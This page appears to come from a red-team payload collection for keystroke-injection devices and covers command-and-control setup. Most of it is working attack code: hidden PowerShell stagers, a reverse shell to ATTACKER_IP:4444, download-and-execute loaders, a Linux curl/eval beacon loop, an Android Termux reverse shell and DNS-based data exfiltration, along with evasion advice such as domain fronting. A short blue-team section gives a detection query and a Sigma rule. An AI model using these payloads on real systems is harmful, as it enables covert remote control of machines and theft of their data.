# FZ-E03: C2 Framework Integration

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-E03 |
| **Name** | C2 Framework Integration |
| **Difficulty** | Expert |
| **Target OS** | Multi-Platform |
| **Focus** | Command & Control setup |
| **MITRE ATT&CK** | T1071 (Application Layer Protocol), T1573 (Encrypted Channel) |

## What This Payload Does

Establishes a connection to a Command and Control (C2) framework, enabling persistent remote access and real-time command execution. This demonstrates integration with popular red team frameworks.

---

## Understanding C2 Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    C2 ARCHITECTURE                           │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   ┌─────────┐         ┌─────────┐         ┌─────────┐       │
│   │ Operator│ ──────► │   C2    │ ◄────── │  Agent  │       │
│   │ Console │         │ Server  │         │ (Target)│       │
│   └─────────┘         └─────────┘         └─────────┘       │
│        │                   │                   │             │
│   Commands            Relay/Store          Execute           │
│   Output              Encrypt              Report            │
│                                                               │
│   COMMUNICATION CHANNELS:                                    │
│   • HTTP/HTTPS (blend with web traffic)                      │
│   • DNS (very stealthy, slow)                                │
│   • TCP/UDP (direct, faster)                                 │
│   • SMB (internal networks)                                  │
│   • WebSocket (persistent connection)                        │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM =============================================
REM EXPERT: C2 Framework Integration
REM Target: Windows 10/11
REM Focus: Establishing C2 connection
REM Skill: Expert
REM WARNING: For authorized testing only
REM =============================================

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -nop
ENTER
DELAY 1500

REM === C2 STAGER - Generic HTTP Beacon ===
REM This demonstrates C2 concepts without actual malware

STRINGLN # C2 Configuration
STRINGLN $C2Server = "https://your-c2-server.com"
STRINGLN $BeaconInterval = 60  # seconds
STRINGLN $Jitter = 0.2  # 20% timing variation

STRINGLN # Generate unique agent ID
STRINGLN $AgentID = [guid]::NewGuid().ToString().Substring(0,8)

STRINGLN # System information for registration
STRINGLN $SysInfo = @{
STRINGLN     id = $AgentID
STRINGLN     hostname = $env:COMPUTERNAME
STRINGLN     user = $env:USERNAME
STRINGLN     os = (Get-WmiObject Win32_OperatingSystem).Caption
STRINGLN     arch = $env:PROCESSOR_ARCHITECTURE
STRINGLN     ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'}).IPAddress -join ','
STRINGLN }

STRINGLN # Registration beacon
STRINGLN function Send-Beacon {
STRINGLN     param($Data)
STRINGLN     try {
STRINGLN         $json = $Data | ConvertTo-Json -Compress
STRINGLN         $response = Invoke-RestMethod -Uri "$C2Server/beacon" -Method POST -Body $json -ContentType "application/json"
STRINGLN         return $response
STRINGLN     } catch {
STRINGLN         return $null
STRINGLN     }
STRINGLN }

STRINGLN # Command execution
STRINGLN function Execute-Command {
STRINGLN     param($Command)
STRINGLN     try {
STRINGLN         $output = Invoke-Expression $Command 2>&1 | Out-String
STRINGLN         return $output
STRINGLN     } catch {
STRINGLN         return $_.Exception.Message
STRINGLN     }
STRINGLN }

STRINGLN # Main beacon loop (demonstration - runs once then exits)
STRINGLN $result = Send-Beacon -Data $SysInfo
STRINGLN if ($result.command) {
STRINGLN     $output = Execute-Command -Command $result.command
STRINGLN     Send-Beacon -Data @{id=$AgentID; output=$output}
STRINGLN }

STRINGLN # For demo, exit after one beacon
STRINGLN exit
```

---

## C2 Framework Examples

### Metasploit Integration

```ducky
REM Metasploit Meterpreter Stager
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
REM Download and execute Meterpreter
STRINGLN $s='ATTACKER_IP';$p=4444;$c=New-Object System.Net.Sockets.TCPClient($s,$p);$st=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$st.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$st.Write($sb,0,$sb.Length)}
```

### Cobalt Strike Beacon

```powershell
# Cobalt Strike PowerShell stager (conceptual)
# Actual implementation would be generated by Cobalt Strike

# Stage 1: Download beacon
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$data = $wc.DownloadData("https://teamserver/beacon")

# Stage 2: Load in memory
$assembly = [System.Reflection.Assembly]::Load($data)

# Stage 3: Execute
$type = $assembly.GetTypes()[0]
$method = $type.GetMethod("Execute")
$method.Invoke($null, @())
```

### Empire/Starkiller Agent

```powershell
# Empire PowerShell agent stager (conceptual)
$server = "https://empire-server:port"
$staging_key = "STAGING_KEY"

# Download and execute agent
$wc = New-Object Net.WebClient
$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$response = $wc.DownloadString("$server/stage1")
IEX $response
```

### Covenant Grunt

```powershell
# Covenant Grunt stager (conceptual)
# Generated by Covenant C2

$CovenantURI = "https://covenant-server"
$CovenantCert = "CERT_HASH"

# Establish connection
# Download Grunt assembly
# Execute in memory
```

### Sliver Implant

```powershell
# Sliver implant stager (conceptual)
# Would download and execute Sliver beacon

$server = "https://sliver-server:443"
# mTLS or HTTP(S) connection
# Execute implant in memory
```

---

## Cross-Platform C2

### macOS C2 Stager

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Python-based C2 beacon
STRINGLN python3 -c "
STRINGLN import urllib.request, json, subprocess, socket
STRINGLN server = 'https://c2-server.com'
STRINGLN data = {'host': socket.gethostname(), 'user': subprocess.getoutput('whoami')}
STRINGLN req = urllib.request.Request(server + '/beacon', json.dumps(data).encode(), {'Content-Type': 'application/json'})
STRINGLN resp = urllib.request.urlopen(req).read()
STRINGLN "
```

### Linux C2 Stager

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Bash-based beacon
STRINGLN while true; do
STRINGLN   CMD=$(curl -s https://c2-server.com/cmd?id=$(hostname))
STRINGLN   if [ -n "$CMD" ]; then
STRINGLN     OUTPUT=$(eval "$CMD" 2>&1)
STRINGLN     curl -s -X POST -d "$OUTPUT" https://c2-server.com/output
STRINGLN   fi
STRINGLN   sleep $((60 + RANDOM % 30))
STRINGLN done &
```

### Android C2 (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN pkg install python -y
STRINGLN python -c "
STRINGLN import socket, subprocess
STRINGLN s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
STRINGLN s.connect(('C2_SERVER', 4444))
STRINGLN while True:
STRINGLN     cmd = s.recv(1024).decode()
STRINGLN     if cmd == 'exit': break
STRINGLN     output = subprocess.getoutput(cmd)
STRINGLN     s.send(output.encode())
STRINGLN " &
```

---

## C2 Communication Channels

### HTTP/HTTPS Beacon

```powershell
# Blend with normal web traffic
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Accept" = "text/html,application/xhtml+xml"
}

while ($true) {
    $cmd = Invoke-RestMethod -Uri "https://c2/tasks" -Headers $headers
    if ($cmd) {
        $output = iex $cmd
        Invoke-RestMethod -Uri "https://c2/results" -Method POST -Body $output
    }
    $jitter = Get-Random -Minimum 50 -Maximum 70
    Start-Sleep -Seconds $jitter
}
```

### DNS Beacon (Stealthy)

```powershell
# Encode data in DNS queries
function Send-DNSBeacon {
    param($Data)
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Data))
    $encoded = $encoded -replace '\+','-' -replace '/','_' -replace '=',''

    # Split into chunks (max 63 chars per label)
    for ($i = 0; $i -lt $encoded.Length; $i += 60) {
        $chunk = $encoded.Substring($i, [Math]::Min(60, $encoded.Length - $i))
        Resolve-DnsName "$chunk.c2domain.com" -Type TXT -DnsOnly -ErrorAction SilentlyContinue
    }
}
```

---

## Red Team Perspective

### C2 Selection Criteria

| Framework | Stealth | Features | Complexity |
|-----------|---------|----------|------------|
| Metasploit | Low | Many | Medium |
| Cobalt Strike | High | Many | High |
| Empire/Starkiller | Medium | Good | Medium |
| Sliver | High | Growing | Medium |
| Covenant | Medium | Good | Medium |

### OPSEC Considerations

1. **Domain Fronting**: Hide C2 behind CDN
2. **Malleable C2**: Customize traffic patterns
3. **Jitter**: Randomize beacon timing
4. **Encryption**: Always encrypt traffic
5. **Fallback**: Multiple communication channels

---

## Blue Team Perspective

### C2 Detection

```powershell
# Detect potential C2 beacons
# Look for periodic connections to same host

Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'
    Id=3  # Network connection
} -MaxEvents 1000 | Group-Object {
    $_.Properties[14].Value  # Destination IP
} | Where-Object { $_.Count -gt 10 } | Sort-Object Count -Descending
```

### Sigma Rule

```yaml
title: Potential C2 Beacon Activity
status: experimental
description: Detects potential C2 beacon patterns
logsource:
    product: windows
    category: ps_script
detection:
    selection_beacon:
        ScriptBlockText|contains:
            - 'Invoke-RestMethod'
            - 'while.*true'
            - 'Start-Sleep'
            - 'beacon'
    selection_c2:
        ScriptBlockText|contains:
            - 'TCPClient'
            - 'WebClient'
            - 'DownloadString'
    condition: selection_beacon and selection_c2
level: high
```

---

## Payload File

Save as `FZ-E03_C2_Framework.txt`:

```ducky
REM FZ-E03: C2 Framework Integration
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -nop
ENTER
DELAY 1500
STRINGLN $id=[guid]::NewGuid().ToString().Substring(0,8);$info=@{id=$id;host=$env:COMPUTERNAME;user=$env:USERNAME}|ConvertTo-Json;try{Invoke-RestMethod -Uri "https://YOUR-C2/beacon" -Method POST -Body $info -ContentType "application/json"}catch{};exit
```

---

[← FZ-E02 Fileless Attack](FZ-E02_Fileless_Attack.md) | [Back to Expert](README.md) | [Next: FZ-E04 EDR Evasion →](FZ-E04_EDR_Evasion.md)
